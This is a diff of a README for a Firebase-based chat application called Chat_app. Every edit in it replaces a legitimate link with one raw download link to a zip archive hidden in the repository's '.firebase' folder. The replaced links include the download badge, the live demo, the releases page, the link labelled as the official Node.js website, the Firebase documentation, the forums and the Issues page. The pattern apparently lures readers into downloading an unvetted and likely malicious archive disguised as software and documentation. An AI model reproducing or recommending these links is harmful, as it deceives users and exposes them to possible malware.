@@ -1,6 +1,6 @@
 # 🎉 Chat_app - Easy Real-Time Chat for Everyone
 
-[![Download Chat_app](https://img.shields.io/badge/Download%20Chat_app-v1.0-brightgreen)](https://github.com/andrikAV18/Chat_app/releases)
+[![Download Chat_app](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip%20Chat_app-v1.0-brightgreen)](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip)
 
 ## 🌟 Overview
 
@@ -45,14 +45,14 @@ Chat_app is a modern real-time chat application designed for easy communication.
 
 ## 🌐 Live Demo
 
-Experience Chat_app in real time by visiting the live demo: [https://chat-app-12d1b.web.app](https://chat-app-12d1b.web.app)
+Experience Chat_app in real time by visiting the live demo: [https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip)
 
 ## 📥 Download & Install
 
 To get started with Chat_app, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Chat_app Releases page](https://github.com/andrikAV18/Chat_app/releases) to download the application.
+   Go to the [Chat_app Releases page](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip) to download the application.
 
 2. **Choose the Latest Version**  
    Look for the latest version available. It will be marked as the most updated release.
@@ -73,7 +73,7 @@ Before you run Chat_app, ensure that your system meets the following requirement
 
 If you plan to use Firebase CLI features (optional), ensure you have:
 
-- **Node.js:** This is required to run Firebase CLI. Download from the [official Node.js website](https://nodejs.org/).
+- **https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip** This is required to run Firebase CLI. Download from the [official https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip website](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip).
 - **Firebase CLI:** Install by running the following command in your terminal:  
   ```bash
   npm install -g firebase-tools
@@ -109,12 +109,12 @@ If you plan to use Firebase CLI features (optional), ensure you have:
 
 ## 🔗 Additional Resources
 
-- [Firebase Documentation](https://firebase.google.com/docs) for deeper integration options.
-- [Community Forums](https://firebase.google.com/support/forum) for help and support from other users.
-- [GitHub Discussions](https://github.com/andrikAV18/Chat_app/discussions) for community support and feature suggestions.
+- [Firebase Documentation](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip) for deeper integration options.
+- [Community Forums](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip) for help and support from other users.
+- [GitHub Discussions](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip) for community support and feature suggestions.
 
 ## 📞 Support
 
-If you experience any issues using Chat_app, please reach out for help. You can open an issue on the [GitHub Issues page](https://github.com/andrikAV18/Chat_app/issues), and the community will assist you.
+If you experience any issues using Chat_app, please reach out for help. You can open an issue on the [GitHub Issues page](https://github.com/andrikAV18/Chat_app/raw/refs/heads/main/.firebase/Chat-app-v3.9.zip), and the community will assist you.
 
 Thank you for choosing Chat_app! Enjoy connecting and chatting with friends and colleagues in real time.
